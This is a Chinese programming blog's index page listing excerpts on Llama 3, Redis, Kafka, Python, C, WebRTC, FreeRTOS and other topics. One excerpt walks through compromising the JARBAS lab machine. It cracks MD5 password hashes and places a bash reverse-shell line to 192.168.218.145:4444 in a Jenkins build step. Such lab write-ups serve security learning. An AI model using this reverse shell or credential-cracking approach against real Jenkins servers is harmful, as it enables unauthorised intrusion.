<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.133.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大咖的博客">
		<meta property="og:url" content="https://bcdaka.github.io/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="编程大咖">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c68033cf70a7e1965af75acb01955ca0/" rel="bookmark">
			测试：ollama加载羊驼版本llama-3中文大模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		找了一个晚上各种模型，像极了当初找各种操作系统的镜像，雨林木风，深蓝、老毛桃……
主要是官方的默认7B版本回答好多英文，而且回复的很慢，所以我是在ollama上搜索"chinese"找到了这个羊驼版本的，
ollama run lgkt/llama3-chinese-alpaca 等大概10分钟左右；
反应的速度还挺快的。
但是测试下来不尽人意啊：
资源地址：
https://ollama.com/lgkt/llama3-chinese-alpacaGet up and running with large language models.https://ollama.com/lgkt/llama3-chinese-alpacaGitHub - ymcui/Chinese-LLaMA-Alpaca-3: 中文羊驼大模型三期项目 (Chinese Llama-3 LLMs) developed from Meta Llama 3中文羊驼大模型三期项目 (Chinese Llama-3 LLMs) developed from Meta Llama 3 - ymcui/Chinese-LLaMA-Alpaca-3https://github.com/ymcui/Chinese-LLaMA-Alpaca-3/tree/main
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27d9198412950e8667fbbba1ff4f0987/" rel="bookmark">
			Redis用GEO实现附近的人功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 ☃️概述☃️命令演示☃️API将数据库表中的数据导入到redis中去☃️实现附近功能 ☃️概述 GEO就是Geolocation的简写形式，代表地理坐标。Redis在3.2版本中加入了对GEO的支持，允许存储地理坐标信息，帮助我们根据经纬度来检索数据。常见的命令有：
GEOADD：添加一个地理空间信息，包含：经度（longitude）、纬度（latitude）、值（member）GEODIST：计算指定的两个点之间的距离并返回GEOHASH：将指定member的坐标转为hash字符串形式并返回GEOPOS：返回指定member的坐标GEORADIUS：指定圆心、半径，找到该圆内包含的所有member，并按照与圆心之间的距离排序后返回。6.以后已废弃GEOSEARCH：在指定范围内搜索member，并按照与指定点之间的距离排序后返回。范围可以是圆形或矩形。6.2.新功能GEOSEARCHSTORE：与GEOSEARCH功能一致，不过可以把结果存储到一个指定的key。 6.2.新功能 ☃️命令演示 我们先来看看 GEOADD 命令，它用于添加地理空间信息。
我会以一个简单的例子来演示：
GEOADD places 13.361389 38.115556 "Palermo" 15.087269 37.502669 "Catania"
这个命令将在名为 places 的地理空间集合中添加两个地点，分别是 “Palermo” 和 “Catania”。它们的经纬度分别是 (13.361389, 38.115556) 和 (15.087269, 37.502669)。
接下来是 GEODIST 命令，它用于计算两个地点之间的距离。我们可以这样演示：
GEODIST places "Palermo" "Catania" km
这个命令将计算 “Palermo” 和 “Catania” 之间的距离，并以千米为单位返回距离值。
接着是 GEOHASH 命令，它将地点的坐标转换为哈希字符串形式：
GEOHASH places "Palermo"
这个命令会返回 “Palermo” 的坐标哈希字符串。
下一个是 GEOPOS 命令，它返回指定地点的坐标：
GEOPOS places "Palermo"
这个命令会返回 “Palermo” 的经纬度坐标。
然后是 GEORADIUS 命令，不过请注意这个命令在 Redis 6 版本后已经废弃了，我们可以使用 GEOSEARCH 来替代：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27d9198412950e8667fbbba1ff4f0987/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de111b68a13bd32b3087045b2b08c205/" rel="bookmark">
			Python魔法之旅-魔法方法(05)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、概述
1、定义
2、作用
二、应用场景
1、构造和析构
2、操作符重载
3、字符串和表示
4、容器管理
5、可调用对象
6、上下文管理
7、属性访问和描述符
8、迭代器和生成器
9、数值类型
10、复制和序列化
11、自定义元类行为
12、自定义类行为
13、类型检查和转换
14、自定义异常
三、学习方法
1、理解基础
2、查阅文档
3、编写示例
4、实践应用
5、阅读他人代码
6、参加社区讨论
7、持续学习
8、练习与总结
9、注意兼容性
10、避免过度使用
四、魔法方法
17、__float__方法
17-1、语法
17-2、参数
17-3、功能
17-4、返回值
17-5、说明
17-6、用法
18、__floor__方法
18-1、语法
18-2、参数
18-3、功能
18-4、返回值
18-5、说明
18-6、用法
19、__floordiv__方法
19-1、语法
19-2、参数
19-3、功能
19-4、返回值
19-5、说明
19-6、用法
五、推荐阅读
1、Python筑基之旅
2、Python函数之旅
3、Python算法之旅
4、博客个人主页
一、概述 1、定义 魔法方法(Magic Methods/Special Methods，也称特殊方法或双下划线方法)是Python中一类具有特殊命名规则的方法，它们的名称通常以双下划线(`__`)开头和结尾。
魔法方法用于在特定情况下自动被Python解释器调用，而不需要显式地调用它们，它们提供了一种机制，让你可以定义自定义类时具有与内置类型相似的行为。
2、作用 魔法方法允许开发者重载Python中的一些内置操作或函数的行为，从而为自定义的类添加特殊的功能。
二、应用场景 1、构造和析构 1-1、__init__(self, [args...])：在创建对象时初始化属性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de111b68a13bd32b3087045b2b08c205/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fbc9ec8df7a3e14562528de5ffba1ab/" rel="bookmark">
			Kafka 如何保证可靠性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 在如今的分布式环境时代，任何一款中间件产品，大多都有一套机制去保证高可用的，Kafka 作为一个商业级消息中间件，消息可靠性的重要性可想而知，那 Kafka 如何保证可靠性的呢？本文从 Producer 往 Broker 发送消息、Topic 分区副本以及 Leader 选举几个角度介绍 Kafka 是如何保证可靠性的。
二、Producer 往 Broker 发送消息 如果我们要往 Kafka 对应的主题发送消息，我们需要通过 Producer 完成。前面我们讲过 Kafka 主题对应了多个分区，每个分区下面又对应了多个副本；为了让用户设置数据可靠性， Kafka 在 Producer 里面提供了消息确认机制。把选项提供给用户自己去选择，我们可以通过配置来决定消息发送到对应分区的几个副本才算消息发送成功。可以在定义 Producer 时通过 acks 参数指定（在 0.8.2.X 版本之前是通过 request.required.acks 参数设置的，详见 KAFKA-3043）。
这个参数支持以下三种值：
acks = 0：意味着如果生产者能够通过网络把消息发送出去，那么就认为消息已成功写入 Kafka 。在这种情况下还是有可能发生错误，比如发送的对象无能被序列化或者网卡发生故障，但如果是分区离线或整个集群长时间不可用，那就不会收到任何错误。在 acks=0 模式下的运行速度是非常快的（这就是为什么很多基准测试都是基于这个模式），你可以得到惊人的吞吐量和带宽利用率，不过如果选择了这种模式， 一定会丢失一些消息。acks = 1：意味着 Leader 在收到消息并把它写入到本地磁盘时会返回确认或错误响应，不管其它的 Follower 副本有没有同步过这条消息。在这个模式下，如果发生正常的 Leader 选举，生产者会在选举时收到一个 LeaderNotAvailableException 异常，如果生产者能恰当地处理这个错误，它会重试发送消息，最终消息会安全到达新的 Leader 那里。不过在这个模式下仍然有可能丢失数据，比如消息已经成功写入 Leader，但在消息被复制到 Follower 副本之前 Leader发生崩溃。acks = all（这个和 request.required.acks = -1 含义一样）：意味着 Leader 在返回确认或错误响应之前，会等待所有同步副本都收到消息。如果和 min.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fbc9ec8df7a3e14562528de5ffba1ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55ab6a61333d80ba01734a3f15288dc3/" rel="bookmark">
			VSCode配置Java、Maven、Spring Boot开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境准备 软件：
vscode-1.89.1(system setup)
插件：
Extension Pack for Java-v0.26.0
Spring Boot Extension Pack-v0.2.1
Red Hat Dependency Analytics-v0.9.4 (Preview)
JDK(至少其中一个不低于jdk11)：
jdk-8u102-windows-x64
jdk-17.0.11（我建议下载jdk-17）
maven(至少不低于3.6.3):
apache-maven-3.8.8
说明：
由于我的电脑之前已经做过jdk-8和maven-3.6.0的全局配置，不想重新配置环境变量，所以另外下载了jdk17和maven-3.8.8。如果你的jdk和maven符合要求，正常安装即可；如果和我的情况一样或相似，只需要将jdk-17和maven-3.8.8下载解压即可，暂时无需额外的操作。
Java环境配置 1、首先正常安装VSCode，这步不必多说。
2、安装插件Language Support for Java(TM) by Red Hat-1.30.0 3、在VSCode首页，点击左下角的齿轮图标→Settings，搜索框内输入“java:home”，点击“Edit in settings.json”
4、在settings.json中，有两个参数需要注意一下：
java.jdt.ls.java.home和java.configuration.runtimes；如果没有，则手动创建。
java.jdt.ls.java.home仅支持jdk11及以上，但是java.configuration.runtimes.是仍支持jdk8的，所以如下写即可：
"java.jdt.ls.java.home": "D:\\_01software\\_03work\\_03idea\\jdk-17.0.11", "java.configuration.runtimes": [ { "name": "JavaSE-1.8", "path": "D:\\_01software\\_03work\\_03idea\\jdk-8u102-windows-x64", "default": true }, { "name": "JavaSE-17", "path": "D:\\_01software\\_03work\\_03idea\\jdk-17.0.11", } 将路径改成你自己的路径，到这里，settings.json先保存但别关闭。
5、保存之后，安装Extension Pack for Java-v0.26.0扩展
6、安装完成之后，按住“Ctrl+Shift+P”，输入“Java:Configure Java Runtime”，可查看、修改项目的Java版本。
Maven环境配置 1、首先找到maven-3.8.8的解压位置，然后apache-maven-3.8.8→conf→settings.xml，打开这个文件，配置一下mirror和localRepository，如下：
&lt;localRepository&gt;D:\_01software\_03work\_03idea\apache-maven-3.8.8-Repository&lt;/localRepository&gt; &lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55ab6a61333d80ba01734a3f15288dc3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae278c42469da0914a50d254f42a4fff/" rel="bookmark">
			AI作画算法原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述 AI作画算法的原理相当复杂，涉及多个领域的知识，包括计算机视觉、机器学习和神经网络等。我们从以下几个方面来描述AI作画算法的基本原理。
2. 数据准备 在数据准备方面，AI作画算法通常需要大量的图像数据作为训练样本。可以是各种各样的艺术作品、照片或其他类型的图像。数据准备的过程包括收集、清洗和标记数据，确保训练集具有足够的多样性和质量，以便生成器和判别器可以学习到丰富的图像特征和样式。
3. 神经网络架构 AI作画算法通常使用生成对抗网络（GANs）或变分自编码器（VAEs）等深度学习模型。
生成对抗网络（GANs）：
GAN由两个神经网络组成：生成器（Generator）和判别器（Discriminator）。
生成器：负责生成假图片，尝试骗过判别器。
判别器：负责辨别图片是真实的还是生成的。
这两个网络在训练过程中互相竞争，生成器不断改进以生成更逼真的图片，而判别器也不断提高鉴别能力。
变分自编码器（VAEs）：
VAE包括一个编码器（Encoder）和解码器（Decoder）。
编码器：将输入图片编码成一个低维的潜在空间表示。
解码器：从潜在空间表示中生成新的图片。
VAE通过最大化数据的似然估计来生成新图片，使生成的图片具有与训练数据类似的特征。
4. 训练过程 训练过程中，模型需要不断调整其参数以提高生成图片的质量。通常需要大量的计算资源和时间。训练的目标是使生成的图片逐渐变得更加真实和多样化。
AI 作画的训练过程通常包括以下步骤：
模型选择：选择适合任务的神经网络架构，如CNN或GANs。
初始化参数：初始化模型的参数，通常使用随机初始化的方法。
前向传播：将数据输入到模型中，通过前向传播计算模型的输出。
损失计算：计算模型输出与真实标签之间的损失，用于衡量模型预测的准确程度。
反向传播：利用反向传播算法，计算损失函数对模型参数的梯度，并更新参数以最小化损失。
优化器调整：使用优化算法（如梯度下降）调整模型参数，使损失函数逐渐减小，模型性能逐渐提升。
迭代训练：重复以上步骤，多次迭代训练模型，直到模型收敛或达到预定的训练轮次。
5. 损失函数 损失函数是衡量生成图片质量的重要指标。在GAN中，生成器和判别器的损失函数需要分别计算，常见的损失函数有交叉熵损失等。
交叉熵损失：
通常用于分类问题，特别是多类别分类问题，衡量的是实际类别标签与概率分布预测的差异。
公式（对于二分类）：
在VAE中，损失函数通常包括重构损失和KL散度损失。
重构损失（Reconstruction Loss）：
衡量重建图像与原始图像之间的差异。
通常使用均方误差（MSE）或二进制交叉熵（Binary Cross-Entropy）来计算。
目标是使解码器生成的图像尽可能接近原始输入图像。
KL散度损失（Kullback-Leibler Divergence Loss）：
衡量潜在变量分布与先验分布（通常是标准正态分布）之间的差异。
公式为：
其中Q(z∣X)​是编码器生成的潜在分布，P(z)​是先验分布。
目标是使潜在变量分布接近先验分布，从而促进模型的正则化和生成的多样性。
6.. 优化算法 在训练过程中，使用优化算法（如Adam或SGD）来更新神经网络的权重，以最小化损失函数。优化算法的选择和参数设置对模型的性能有很大影响。
7. 生成图片 训练完成后，生成器可以接收一个随机噪声向量，并输出一张新图片。通过调节输入的随机向量，可以生成各种风格和内容的图片。
8. 评价生成效果 评价生成图片的效果通常需要主观和客观相结合的方法。主观评价依赖于人类的视觉判断，而客观评价可以使用指标如Inception Score (IS) 和Fréchet Inception Distance (FID)等。
9.小结 AI作画算法通过深度学习模型从大量图片数据中学习，生成具有艺术风格的图片。涉及数据准备、模型架构设计、训练过程、损失函数选择和优化算法的使用等多个环节。通过不断的训练和优化，AI能够生成逼真且具有艺术性的作品。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28eaafd02a91aa10c115f1af350c34f7/" rel="bookmark">
			[Algorithm][动态规划][子序列问题][最长递增子序列][摆动序列]详细讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 0.子序列 vs 子数组1.最长递增子序列1.题目链接2.算法原理详解3.代码实现 2.摆动序列1.题目链接2.题目链接3.代码实现 0.子序列 vs 子数组 子序列： 相对顺序是跟源字符串/数组是一致的但是元素和元素之间，在源字符串/数组中可以是不连续的一般时间复杂度： O ( 2 n ) O(2^n) O(2n) 子数组： 在源字符串/数组中挑出来，必须是连续的 子串与子数组是一个意思 一般时间复杂度： O ( N 2 ) O(N^2) O(N2) 子序列其实相当于包含了子数组子序列问题经典解法：两层循环 1.最长递增子序列 1.题目链接 最长递增子序列 2.算法原理详解 注意：本题思考方式非常有标志性思路： 确定状态表示 -&gt; dp[i]的含义
以i位置元素为结尾的所有子序列中，最长递增子序列的长度 推导状态转移方程
初始化：vector&lt;int&gt; dp(n, 1)
确定填表顺序：从左往右
确定返回值：整个dp表里的最大值
3.代码实现 int lengthOfLIS(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; dp(n, 1); int ret = 1; for(int i = 1; i &lt; n; i++) { for(int j = 0; j &lt; i; j++) { if(nums[j] &lt; nums[i]) { dp[i] = max(dp[i], dp[j] + 1); } } ret = max(ret, dp[i]); } return ret; } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28eaafd02a91aa10c115f1af350c34f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f82a19e8560b85f26a1d48274d1c1160/" rel="bookmark">
			WebRTC 在 Android 端实现一对一通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WebRTC 在 Android 端实现一对一通信 WebRTC 在 Android 端实现一对一通信申请权限申请静态权限申请动态权限 引入 WebRTC 库构造 PeerConnectionFactory创建音视频源视频采集视频渲染创建 PeerConnection建立信令系统参考 WebRTC 在 Android 端实现一对一通信 在 Android 端，我们将按以下几个步骤实现 WebRTC 一对一通信：
申请权限引入 WebRTC 库构造 PeerConnectionFactory创建音视频源视频采集视频渲染创建 PeerConnection建立信令系统 申请权限 至少需要申请三种权限：
CAMERA 权限:用于采集视频数据RECORD_AUDIO 权限：用于采集音频数据INTERNET 权限：用于通过网卡传输媒体数据 在Android中，申请权限分为静态权限申请和动态权限申请。
申请静态权限 在 Android 项目中的 AndroidManifest.xml 中增加以下代码：
&lt;uses-feature android:name="android.hardware.camera" /&gt; &lt;uses-feature android:glEsVersion="0x00020000" android:required="true" /&gt; &lt;uses-permission android:name="android.permission.CAMERA" /&gt; &lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt; &lt;uses-permission android:name="android.permission.INTENET" /&gt; 申请动态权限 随着 Android 的发展，对安全性要求越来越高。除了申请静态权限之外，还需要动态申请权限。
API：
void requestPermissions(String[] permissions, intrequestCode); 实际上，对于权限这块的处理真正做细了要写不少代码，好在 Android 官方给我们又提供了一个非常好用的库 EasyPermissions，有了这个库我们可以少写不少代码。使用 EasyPermissions 非常简单，在MainActivity 文件的 onCreate() 方法中调用 requestPermissions() 方法即可，当然还要实现 onRequestPermissionsResult() 回调方法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f82a19e8560b85f26a1d48274d1c1160/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca52f9b5b3ff4eba407ddb39f1b89da7/" rel="bookmark">
			【哈希】用哈希桶封装unordered_map &amp; unordered_set
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🎉博主首页： 有趣的中国人 🎉专栏首页： C++进阶 🎉其它专栏： C++初阶 | Linux | 初阶数据结构 小伙伴们大家好，本片文章将会讲解 用哈希桶封装 unordered_map &amp; unordered_set 的相关内容。
如果看到最后您觉得这篇文章写得不错，有所收获，麻烦点赞👍、收藏🌟、留下评论📝。您的支持是我最大的动力，让我们一起努力，共同成长！
🎉系列文章： 1. 闭散列的线性探测实现哈希表 🎉系列文章： 2. 开散列的哈希桶实现哈希表
文章目录 `0. 前言``1. K模型和KV模型模板参数传递`==&lt;font color = blue&gt;&lt;b&gt;🎧1.0 相关解释🎧====&lt;font color = blue&gt;&lt;b&gt;🎧1.1 模板参数传递思路🎧====&lt;font color = blue&gt;&lt;b&gt;🎧1.2 模板参数传递图解🎧== `2. 哈希表中函数的修改`==&lt;font color = blue&gt;&lt;b&gt;🎧2.1 Insert函数修改思路🎧====&lt;font color = blue&gt;&lt;b&gt;🎧2.2 Insert函数修改后的代码🎧====&lt;font color = blue&gt;&lt;b&gt;🎧2.3 Find &amp; Erase 函数的修改🎧====&lt;font color = blue&gt;&lt;b&gt;🎧2.4 Find &amp; Erase 修改后的代码🎧== `3. 哈希表迭代器的实现`==&lt;font color = blue&gt;&lt;b&gt; 🎧3.1 operator++() 的实现🎧====&lt;font color = blue&gt;&lt;b&gt; 🎧3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca52f9b5b3ff4eba407ddb39f1b89da7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c214ebaad056449a392ad207cf30d3b/" rel="bookmark">
			JARBAS - Jenkins渗透原理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nmap端口扫描 主机发现
创建文件夹进行保存扫描记录
指定最低1万速率扫描所有端口
提取端口
详细扫描
脚本扫描
web渗透 脚本扫描里有robots；去看一下
# we don't want robots to click "build" links User-agent: * Disallow: / 先目录爆破80端口
没有信息
另一个扫描工具
也没有任何发现
点击网站；看有没有啥提示
我们再指定一下扩展名
可以看到access.html
老黑兄弟来帮忙提示了
以安全的方式加密的信用证！
tiago:5978a63b4654c73c60fa24f836386d87 trindade:f463f63616cb3f1e81ce46b39f882fd5 eder:9b38e2b1e8b12f426b0d208a7ab6cb98 如果不知道编码方式可以使用hash-identifier来识别一下
就是md5
解码
tiago:italia99 trindade:marianna eder:vipsu 使用第三个账户密码登录成功
我们应该是获得了更高的一个访问权限
Jenkins是一套著名内容管理系统；持续集成工具
了解不了解关系不大；但是我们需要懂得bug利用方式
简单点击查看管理系统功能
获得初级系统权限 创建一个任务；填写名称；确定
第一个执行windows p 处理命令；因为扫描过程中，我们知道这个不是windows
第二个执行shell ；我们就用它
这样我们写shell脚本
/bin/bash -i &gt;&amp; /dev/tcp/192.168.218.145/4444 0&gt;&amp;1 就需要我们在kali中开启监听4444端口
保存；理论上来说我们构建的反弹shell，点击立即构建就能够让kali收到一个反弹shell
好，看kali中已经返回shell；同时上图也显示正在执行的任务
crontab系统提权 正常查看下版本；用户；组；sudo -l权限； sudo提权没戏，那就看passwd
查看下有哪些用户；目前我们的用户bash环境不太稳定，shadow无权查看
eder；root
我们就在其他提权路线做些尝试
先看一下系统有没有自动任务吧
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c214ebaad056449a392ad207cf30d3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1285a87fb1df25fe17feb403c0e28145/" rel="bookmark">
			一文速览Llama 3及其微调：从如何把长度扩展到100万到如何微调Llama3 8B
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 4.19日凌晨正准备睡觉时，突然审稿项目组的文弱同学说：Meta发布Llama 3系列大语言模型了，一查，还真是
本文以大模型开发者的视角，基于Meta官方博客的介绍：Introducing Meta Llama 3: The most capable openly available LLM to date，帮你迅速梳理下LLama的关键特征，并对比上一个版本的LLama2，且本文后续，将更新用我司paper-review数据集微调llama3的训练过程
第一部分 Meta发布Llama 3：所有大模型开发者的福音 1.1 Llama 3的性能 1.1.1 在多个榜单上超越Google的gemma 7B、Mistral 7B 此次发布的Llama 3有两个版本：8B 和 70B。由于预训练和指令微调的加强，模型在推理、代码生成和指令跟踪等方面的能力得到比较大的提高，最终在多个榜单上超越Google的gemma 7B、Mistral 7B(当然了，我还是得说一句，榜单肯定能够说明一些东西，但不代表全部)
1.1.2 一套专门的评估数据集：1800个prompt 涵盖12类任务 为了更好的评估llama3的性能，Meta开发了一套新的高质量人类评估集。该评估集包含 1,800 个prompt，涵盖 12 个关键用例：寻求建议、头脑风暴、分类、封闭式问答、编码、创意写作、提取、塑造角色/角色、开放式问答、推理、重写和总结
且为了防止模型在此评估集上过度拟合，即使Meta的建模团队也无法访问它(说白了，保证评估数据集中的数据不被模型事先学到)
下图显示了Meta针对 Claude Sonnet、Mistral Medium 和 GPT-3.5 对这些类别和提示进行人工评估的汇总结果(compared to competing models of comparable size in real-world scenarios，即PK的开源模型也都是70B左右的大小)
且llama3的预训练模型这些榜单上PK同等规模的其他模型时，亦有着相对突出的表现
1.2 Llama 3：模型架构、预训练数据、扩大预训练和指令微调 1.2.1 模型架构：继续transformer解码器架构、分组查询注意力、8K上下文 和Llama 2一样，Llama 3 继续采用相对标准的decoder-only transformer架构，但做了如下几个关键的改进
Llama 3 使用具有 128K tokens的tokenizer
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1285a87fb1df25fe17feb403c0e28145/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0041d0c9a12295193b7fdc078c3c95d4/" rel="bookmark">
			kafka教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装教程 1、将下载好的kafka安装包通过FinalShell工具复制到指定目录 2、对安装包解压并安装到指定目录下 tar -zxvf kafka_2.12-3.0.0.tgz -C /opt/module/ 3、进入到安装目录，修改文件名称 cd /opt/module/ mv kafka_2.12-3.0.0/ kafka 4、kafka的配置文件修改 （1）修改server.properties文件
broker.id=0
表示kafka在整个集群中的唯一身份标识，不可重复
修改日志存放位置
log.dirs=/opt/module/kafka/datas zookeeper.connect属性配置
详细说明：
#broker 的全局唯一编号，不能重复，只能是数字。 broker.id=0 #处理网络请求的线程数量 num.network.threads=3 #用来处理磁盘 IO 的线程数量 num.io.threads=8 #发送套接字的缓冲区大小 socket.send.buffer.bytes=102400 #接收套接字的缓冲区大小 socket.receive.buffer.bytes=102400 #请求套接字的缓冲区大小 socket.request.max.bytes=104857600 #kafka 运行日志(数据)存放的路径，路径不需要提前创建，kafka 自动帮你创建，可以 配置多个磁盘路径，路径与路径之间可以用"，"分隔 log.dirs=/opt/module/kafka/datas #topic 在当前 broker 上的分区个数 num.partitions=1 #用来恢复和清理 data 下数据的线程数量 num.recovery.threads.per.data.dir=1 # 每个 topic 创建时的副本数，默认时 1 个副本 offsets.topic.replication.factor=1 #segment 文件保留的最长时间，超时将被删除 log.retention.hours=168 #每个 segment 文件的大小，默认最大 1G log.segment.bytes=1073741824 # 检查过期数据的时间，默认 5 分钟检查一次是否数据过期 log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0041d0c9a12295193b7fdc078c3c95d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9de85d2989da15d63b70ccecd0c57314/" rel="bookmark">
			C语言分支和循环（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的相关博客：
C语言的分支与循环（1）
1.switch语句 除了 if 语句外，C语⾔还提供了 switch 语句来实现分⽀结构。 switch 语句是⼀种特殊形式的 的 if...else 结构，⽤于判断条件有多个结果的情况。它把多重 else if 改成更易⽤、可读性更好的形式
switch (expression) { case value1: statement1; break; case value2: statement2; break; default: statement3; break; } 上面代码中，value1，value2对应的是expression的值，如果expression的值符合 value1，则进入statement1，执行其中的语句，紧接着遇到break，退出这个switch
如果expression的值符合value2，则进入statement2，执行其中的语句，紧接着遇到break，退出这个switch
而上面的default，指的是value1、和value2以外的所有情况，都会进入statement3，执行其中的语句
注意：
switch 后的 expression 必须是整型表达式
case 后的值，必须是整形常量表达式 2.if语句和switch语句的对比 实例：：输⼊任意⼀个整数值，计算除2之后的余数
使用if语句时：
int n = 0; scanf("%d", &amp;n); if (n % 2 == 0) printf("整除，余数为0\n"); else printf("余数是1\n"); 而使用switch语句改写，则： int n = 0; scanf("%d", &amp;n); switch (n % 2) { case 0: printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9de85d2989da15d63b70ccecd0c57314/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dce22d21cb83c77e945f76e5dcd0c12/" rel="bookmark">
			freertos初体验 - 在stm32上移植
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 说明 freertos内核 非常精简，代码量也很少，官方也针对主流的编译器和内核准备好了移植文件，所以 freertos 的移植是非常简单的，很多工具（例如CubeMX）点点鼠标就可以生成一个 freertos 的工程，本文就不介绍 CubeMX 生成 freertos 工程的方法了。本文介绍从官网下载 freertos 移植到自己工程的方法，这仍然是一件很简单的事情（除非你准备把他移植到一个官方没有提供移植文件的内核上），与其说是移植，到不如说是把代码加到自己的工程里 。freertos 的移植是很简单的，关键点在于移植成功后，你是否能用好它，是否了解它工作的原理，本文暂不介绍 freertos 的具体实现和工作原理，这会在后面的文章中继续说明，本文只是以是以stm32为例，简单介绍一下移植的步骤。 2. 移植步骤 准备一个目标芯片的工程
这一步不再过多赘述，我这边使用了CubeMX 生成了一个工程。 去官网下载 ferrrtos 源码
下载地址：https://www.freertos.org/zh-cn-cmn-s/a00104.html
浏览一下目录结构，需要加入到工程中的文件都在第三张图和第四张图
将上述图片所说的文件加到自己的工程中，添加后的工程如下：
可以看见。freertos代码并不多，内核一共就这么多代码
由上图可以看见，我们还需要提供一个 FreeRTOSConfig.h 的文件用来配置 freertos，FreeRTOSConfig.h 具体有哪些项本文先不深究，大家可以使用我下面提供的配置文件，这个文件是 CubeMX 生成 freertos工程时生成的。
/* USER CODE BEGIN Header */ /* * FreeRTOS Kernel V10.3.1 * Portion Copyright (C) 2017 Amazon.com, Inc. or its affiliates. All Rights Reserved. * Portion Copyright (C) 2019 StMicroelectronics, Inc. All Rights Reserved.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8dce22d21cb83c77e945f76e5dcd0c12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/927eebfa3550cf95aa599370c2cc35e3/" rel="bookmark">
